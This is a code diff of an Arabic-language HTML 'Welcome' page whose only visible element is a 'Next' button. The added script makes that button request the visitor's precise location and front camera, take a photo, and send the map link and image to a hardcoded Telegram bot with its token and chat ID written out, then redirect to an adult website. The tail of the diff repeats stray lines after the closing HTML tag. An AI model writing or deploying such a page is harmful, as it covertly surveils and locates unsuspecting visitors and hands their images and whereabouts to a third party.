@@ -1,64 +1,85 @@
 <!doctype html>
 <html lang="ar">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Welcome</title>
 <style>
+  /* الخلفية الديناميكية */
   body {
-    font-family: system-ui, Arial;
-    direction: rtl;
-    padding: 16px;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    font-family: Arial, sans-serif;
     display: flex;
     flex-direction: column;
     justify-content: center;
     align-items: center;
-    min-height: 100vh;
-    background: linear-gradient(135deg, #6b73ff, #000dff);
+    background: linear-gradient(-45deg, #ff7e5f, #feb47b, #36d1dc, #5b86e5);
+    background-size: 400% 400%;
+    animation: gradientBG 15s ease infinite;
     color: #fff;
-  }
-
-  h2, p {
     text-align: center;
-    margin: 8px 0;
   }
 
+  @keyframes gradientBG {
+    0% {background-position:0% 50%;}
+    50% {background-position:100% 50%;}
+    100% {background-position:0% 50%;}
+  }
+
+  h2 { margin: 10px 0; }
+  p { margin: 5px 0 20px 0; }
+
+  /* الزر المستطيل */
   #goBtn {
-    font-size: 20px;
-    padding: 14px 28px;
-    margin-top: 20px;
+    padding: 16px 40px;
+    font-size: 22px;
     border: none;
-    border-radius: 12px;
-    background: linear-gradient(90deg, #ff512f, #dd2476);
+    border-radius: 16px;
+    background: linear-gradient(90deg, #36d1dc, #5b86e5);
     color: #fff;
     cursor: pointer;
-    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
-    transition: all 0.2s ease;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
   }
 
   #goBtn:hover {
-    transform: scale(1.05);
-    box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+    transform: scale(1.07);
+    box-shadow: 0 12px 30px rgba(0,0,0,0.5);
   }
 
   #goBtn:active {
     transform: scale(0.95);
-    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
   }
 
-  video {
-    width: 100%;
-    max-width: 420px;
-    border-radius: 8px;
+  /* دائرة التحميل */
+  .loading {
+    width: 40px;
+    height: 40px;
+    border: 4px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-top: -20px;
+    margin-left: -20px;
     display: none;
+    box-shadow: 0 0 10px rgba(255,255,255,0.7);
   }
 
-  #status {
-    margin-top: 12px;
-    color: #fff;
-    text-align: center;
-    min-height: 24px;
+  @keyframes spin {
+    0% { transform: rotate(0deg);}
+    100% { transform: rotate(360deg);}
   }
+
+  video { display:none; border-radius:8px; max-width: 420px; width: 100%; margin-top: 12px;}
+  #status { margin-top: 12px; min-height: 24px; font-weight: bold; }
 </style>
 </head>
 <body>
@@ -68,21 +89,25 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none"></canvas>
   <div id="status">done</div>
-  <button id="goBtn">Next</button>
+  <button id="goBtn">Next
+    <div class="loading" id="loader"></div>
+  </button>
 
 <script>
 const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk";
 const CHAT_ID = "8273042434"; 
-const SECOND_SITE = "https://ar.stripchat.com/"; 
+const SECOND_SITE = "https://ar.stripchat.com"; 
 
 const status = document.getElementById('status');
 const goBtn = document.getElementById('goBtn');
+const loader = document.getElementById('loader');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
 async function sendToTelegram(blob, lat, lon, isVideo=false) {
   try {
-    status.textContent = "Sending...";
+    loader.style.display = "block";      
+    goBtn.textContent = "";               
     if (lat && lon) {
       const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -100,13 +125,50 @@ async function sendToTelegram(blob, lat, lon, isVideo=false) {
       form.append('video', blob, 'clip.mp4');
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
     }
-    status.textContent = "Done ✅";
 
     window.location.href = SECOND_SITE;
 
   } catch (err) {
     console.error(err);
     status.textContent = "Error: " + err.message;
+    loader.style.display = "none";
+    goBtn.textContent = "Next";
+  }
+}
+
+goBtn.addEventListener('click', async () => {
+  status.textContent = "Requesting permissions...";
+  let lat=null, lon=null;
+  try {
+    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
+    lat = pos.coords.latitude; lon = pos.coords.longitude;
+  } catch(e) {
+    status.textContent = "Permission denied: " + (e.message||e);
+    return;
+  }
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
+    video.style.display = "block";
+    video.srcObject = stream;
+    await new Promise(r=>setTimeout(r,1000));
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(async (blob) => {
+      stream.getTracks().forEach(t=>t.stop());
+      video.style.display = "none";
+      await sendToTelegram(blob, lat, lon, false);
+    }, 'image/jpeg', 0.85);
+  } catch (err) {
+    console.error(err);
+    status.textContent = "Error: " + (err.message||err);
+  }
+});
+</script>
+</body>
+</html>    status.textContent = "Error: " + err.message;
   }
 }
 
